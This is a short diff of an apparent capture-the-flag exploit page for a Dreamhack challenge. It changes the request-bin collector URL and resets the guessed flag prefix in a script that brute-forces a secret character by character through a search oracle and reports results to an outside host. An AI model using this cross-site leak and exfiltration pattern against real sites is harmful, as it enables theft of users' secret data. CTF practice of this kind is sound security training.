@@ -11,7 +11,7 @@
     <iframe id="iframe"></iframe>
     <img id="img" />
     <script>
-      const request_bin_url = "https://grboidk.request.dreamhack.games";
+      const request_bin_url = "https://vskmker.request.dreamhack.games";
 
       async function req(url) {
         return await new Promise((resolve, reject) => {
@@ -33,7 +33,7 @@
       }
       async function exploit() {
         let chars = "0123456789abcdef}";
-        let secret = "DH{22d1445ad68e194e044a16dc64";
+        let secret = "DH{";
         while (!secret.includes("}")) {
           for (let c of chars) {
             if (await search(secret + c)) {
